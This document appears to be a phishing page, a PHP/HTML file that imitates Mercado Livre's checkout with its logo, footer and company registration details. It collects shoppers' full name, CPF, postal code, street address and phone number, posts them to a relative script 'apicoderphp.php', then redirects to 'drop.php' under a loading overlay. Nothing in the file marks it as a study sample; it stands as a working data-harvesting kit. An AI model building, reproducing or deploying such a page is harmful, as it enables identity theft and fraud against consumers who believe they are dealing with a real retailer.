<?php 
session_start();
?> <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<div style="margin-top:-20px;display:none;background:rgba(0,0,0,0.5);width:100%;height:150vh;z-index: 9999;position: fixed;" class="cad_sucesso">
   <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:10% auto;width:100%;height:auto !important;">
      
      

     <center> <img border="0" height="50px" src="https://www.anetts.com/imagens/loading.gif" alt=""></center>
      
       
       
         <br>


         </div>
     </div>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img class="peukaskaks" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>
	
	<aside>
		<div class="container">
			<br><br>
			 	<h1 style="font-size:1.6em;">Adicione um endereço</h1>
			 <div class="row">
			 			 	 <div class="col-md-8">
			 	 	<div class="askdjkasjdkjddadosdrop">
			 	 		<form  id="form" method="post">
			 	 			<label for="" style="color:rgb(100,100,100);font-size:13px;">Nome completo</label>
			 	 			<br>
			 	 			<input required  name="nome" class="sdkajsdkinput" type="text"><br>
			 	 			<span style="color:rgb(190,190,190);font-size:11px;">Como aparecem no seu Rg ou CNH.</span>
			 	 			<br><br>
<label for="" style="color:rgb(100,100,100);font-size:13px;">CPF</label>
			 	 			<br>
			 	 			<input maxlength="14" onkeydown="javascript: fMasc( this, mCPF );" required  name="cpf" class="sdkajsdkinput" type="tel"><br><br>
			 	 			<label for="" style="color:rgb(100,100,100);font-size:13px;">CEP</label>
			 	 			<br>
			 	 			<input required id="cep"  name="cep" class="sdkajsdkinput" type="tel"><br>
			 	 			<br>
			 	 			<div class="row">
                              <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Estado</label>
			 	 			<br>
			 	 			<input required id="uf" name="estado" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
                              <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Cidade</label>
			 	 			<br>
			 	 			<input required id="cidade" name="cidade" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>
<br>
			 	 			  <div class="row">
			 	 			  	 <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Bairro</label>
			 	 			<br>
			 	 			<input required id="bairro" name="bairro" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>

			 	 			  <br>

			 	 			  	<div class="row">
                              <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Rua/Avenida</label>
			 	 			<br>
			 	 			<input required id="rua" name="rua" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
                              <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Número</label>
			 	 			<br>
			 	 			<input required name="numero" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>
<br>
			 	 			   <div class="row">
			 	 			  	 <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Complemento (opcional)
</label>
			 	 			<br>
			 	 			<input style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>

			 	 			  <br>

			 	 			  <div class="row">
			 	 			  	<div class="col-md-6">
			 	 			  		<div class="row">
			 	 			  			<p style="color:rgb(141,141,141)">Este é o seu trabalho ou sua casa?</p>
			 	 			  			<div class="col-md-6"><div class="form-check">
  <input class="form-check-input" type="radio" value="Trabalho" name="casa" id="flexRadioDisabled" checked="">
  <label class="form-check-label" for="flexRadioDisabled">
   Trabalho
  </label>
</div></div>
			 	 			  			<div class="col-md-6"><div class="form-check">
  <input class="form-check-input" type="radio" value="Residencial" name="casa" id="flexRadioDisabled" >
  <label class="form-check-label" for="flexRadioDisabled">
  Residencial
  </label>
</div></div>
			 	 			  		</div>
			 	 			  	</div>
			 	 			  </div>
<br>
			 	 			   <div class="row">
			 	 			  	 <div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Telefone de contato

</label>
			 	 			<br>
			 	 			<input maxlength="15" onkeyup="handlePhone(event)" name="telefone" required style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>
			 	 			  <br>
			 	 			    <div class="row">
			 	 			  	 <div class="col-md-12"><label for="" style="color:rgb(100,100,100);font-size:13px;">Informações adicionais deste endereço (opcional)

</label>
			 	 			<br>
			 	 			<input name="complemento" style="width:100%;" class="sdkajsdkinput" type="text"><br></div>
			 	 			  </div>
			 	 	
			 	 	</div><br>
			 	 	<button  style="maring-top:15px !important;" class="buttoncomprar">Continuar</button>


			 	 		</form>
</div>



			 	<div class="col-md-4">
	 <div class="asdlasdaskd92929202020202-22002020">
	 	<p style="font-weight: 600;">Resumo da compra</p>
	 	<hr>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Produtos (<?= $_SESSION['qtdprodutos']?>)</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;">R$ <?= number_format($_SESSION['totalpreco'], 2, ',', '.');?></span></div>
	 		<div style="clear:both;"></div>
	 	</div><br>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Frete</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;color:#00a650;">Grátis

</span></div>
<div style="clear:both;"></div>
	 	</div>
	 	<hr>
	 	

	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;">Você pagará</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;"><strong>R$ <?= number_format($_SESSION['totalpreco'], 2, ',', '.');?><div style="margin-top:-20px;display:none;background:rgba(0,0,0,0.5);width:100%;height:150vh;z-index: 9999;position: fixed;" class="cad_sucesso">
   <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:10% auto;width:100%;height:auto !important;">
      
      

     <center> <img border="0" height="50px" src="https://m.media-amazon.com/images/S/sash/prp2-N9d2Q$gDX5.gif" alt=""></center>
      
       
       
         <br>


         </div>
     </div></strong>

</span></div>
	 	</div>
	 </div>
</div>
	


			 	 </div>
			 </div>
		</div>
	</aside>

<br>

<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>

<script src="https://code.jquery.com/jquery-3.7.1.min.js"
            integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
            crossorigin="anonymous"></script>	

             <script>

        $(document).ready(function() {

            function limpa_formulário_cep() {
                // Limpa valores do formulário de cep.
                $("#rua").val("");
                $("#bairro").val("");
                $("#cidade").val("");
                $("#uf").val("");
                $("#ibge").val("");
            }
            
            //Quando o campo cep perde o foco.
            $("#cep").blur(function() {

                //Nova variável "cep" somente com dígitos.
                var cep = $(this).val().replace(/\D/g, '');

                //Verifica se campo cep possui valor informado.
                if (cep != "") {

                    //Expressão regular para validar o CEP.
                    var validacep = /^[0-9]{8}$/;

                    //Valida o formato do CEP.
                    if(validacep.test(cep)) {

                        //Preenche os campos com "..." enquanto consulta webservice.
                        $("#rua").val("...");
                        $("#bairro").val("...");
                        $("#cidade").val("...");
                        $("#uf").val("...");
                        $("#ibge").val("...");

                        //Consulta o webservice viacep.com.br/
                        $.getJSON("https://viacep.com.br/ws/"+ cep +"/json/?callback=?", function(dados) {

                            if (!("erro" in dados)) {
                                //Atualiza os campos com os valores da consulta.
                                $("#rua").val(dados.logradouro);
                                $("#bairro").val(dados.bairro);
                                $("#cidade").val(dados.localidade);
                                $("#uf").val(dados.uf);
                                $("#ibge").val(dados.ibge);
                            } //end if.
                            else {
                                //CEP pesquisado não foi encontrado.
                                limpa_formulário_cep();
                                alert("CEP não encontrado.");
                            }
                        });
                    } //end if.
                    else {
                        //cep é inválido.
                        limpa_formulário_cep();
                        alert("Formato de CEP inválido.");
                    }
                } //end if.
                else {
                    //cep sem valor, limpa formulário.
                    limpa_formulário_cep();
                }
            });
        });

    </script>


    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
<script>
      $(function(){
         $('#form').bind('submit', function(e){
            e.preventDefault();
            var frete = $("input[name='tipo']:checked").val(); 

            console.log(frete);

            var txt = $(this).serialize();
            console.log(txt);

            $.ajax({
               type:"POST",
               url:"../apicoderphp.php",
               data:txt,
               success:function(data){
                  guid = data;


        $(".cad_sucesso").css({
            display: 'block'
        })

        // IF pix
        
        
          setTimeout(function() {
            $(".cad_sucesso").fadeOut();
           
            setTimeout(function() {
                window.location.href = "drop.php";
            },100);
        }, 3000);
        


       


               }
            });
         });
      });
   </script>

   <script>const handlePhone = (event) => {
  let input = event.target
  input.value = phoneMask(input.value)
}

const phoneMask = (value) => {
  if (!value) return ""
  value = value.replace(/\D/g,'')
  value = value.replace(/(\d{2})(\d)/,"($1) $2")
  value = value.replace(/(\d)(\d{4})$/,"$1-$2")
  return value
}</script>


<script>function ValidaCPF(){	
	var RegraValida=document.getElementById("RegraValida").value; 
	var cpfValido = /^(([0-9]{3}.[0-9]{3}.[0-9]{3}-[0-9]{2})|([0-9]{11}))$/;	 
	if (cpfValido.test(RegraValida) == true)	{ 
	console.log("CPF Válido");	
	} else	{	 
	console.log("CPF Inválido");	
	}
    }
  function fMasc(objeto,mascara) {
obj=objeto
masc=mascara
setTimeout("fMascEx()",1)
}

  function fMascEx() {
obj.value=masc(obj.value)
}

   function mCPF(cpf){
cpf=cpf.replace(/\D/g,"")
cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
cpf=cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2")
return cpf
}</script>
</body>
</html>